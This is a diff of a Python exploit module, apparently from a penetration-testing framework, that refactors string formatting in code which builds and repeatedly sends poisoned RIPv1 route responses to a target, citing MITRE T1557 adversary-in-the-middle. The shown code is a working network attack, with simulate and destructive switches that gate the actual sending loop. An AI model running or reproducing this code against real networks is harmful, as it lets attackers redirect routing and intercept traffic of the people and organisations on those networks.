@@ -121,21 +121,17 @@ class Exploit(Exploit):
 
     def run(self) -> None:
         """Execute RIPv1 route poisoning."""
-        ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
+        ts = datetime.datetime.now(datetime.UTC).isoformat()
         entries = [(str(self.poison_network), str(self.src_ip), int(self.metric))]
         packet = _build_rip_v1_response(entries)
 
         if self.simulate:
             print_status(
-                "\033[94m[SIMULATE]\033[0m [RIP-POISON] Would send RIPv1 Response to {}:{}\n"
-                "  Network: {} metric={} next-hop={}\n"
-                "  Payload ({} bytes): {}\n"
+                f"\033[94m[SIMULATE]\033[0m [RIP-POISON] Would send RIPv1 Response to {self.destination}:{_RIP_PORT}\n"
+                f"  Network: {self.poison_network} metric={self.metric} next-hop={self.src_ip}\n"
+                f"  Payload ({len(packet)} bytes): {packet.hex()}\n"
                 "  MITRE: T1557 (Adversary-in-the-Middle via routing poisoning)\n"
-                "  Set simulate=false + destructive=true to execute.".format(
-                    self.destination, _RIP_PORT,
-                    self.poison_network, self.metric, self.src_ip,
-                    len(packet), packet.hex(),
-                )
+                "  Set simulate=false + destructive=true to execute."
             )
             return
 
@@ -152,29 +148,25 @@ class Exploit(Exploit):
                 except OSError:
                     pass
         except OSError as exc:
-            print_error("[RIP-POISON] Socket error: {}".format(exc))
+            print_error(f"[RIP-POISON] Socket error: {exc}")
             return
 
-        print_status("[RIP-POISON] Sending {} RIPv1 poison packet(s) to {}:{}...".format(
-            self.repeat, self.destination, _RIP_PORT
-        ))
+        print_status(f"[RIP-POISON] Sending {self.repeat} RIPv1 poison packet(s) to {self.destination}:{_RIP_PORT}...")
 
         sent = 0
         for i in range(int(self.repeat)):
             try:
                 sock.sendto(packet, (str(self.destination), _RIP_PORT))
                 sent += 1
-                print_info("[RIP-POISON] Sent #{} ({} bytes)".format(i + 1, len(packet)))
+                print_info(f"[RIP-POISON] Sent #{i + 1} ({len(packet)} bytes)")
             except OSError as exc:
-                print_error("[RIP-POISON] Send error on #{}: {}".format(i + 1, exc))
+                print_error(f"[RIP-POISON] Send error on #{i + 1}: {exc}")
             if int(self.interval) > 0 and i < int(self.repeat) - 1:
                 time.sleep(float(self.interval))
 
         sock.close()
         if sent > 0:
             print_success(
-                "[RIP-POISON] Sent {} poisoned RIPv1 Response packet(s). "
-                "Check routing table on target for {}/metric={}.".format(
-                    sent, self.poison_network, self.metric
-                )
+                f"[RIP-POISON] Sent {sent} poisoned RIPv1 Response packet(s). "
+                f"Check routing table on target for {self.poison_network}/metric={self.metric}."
             )
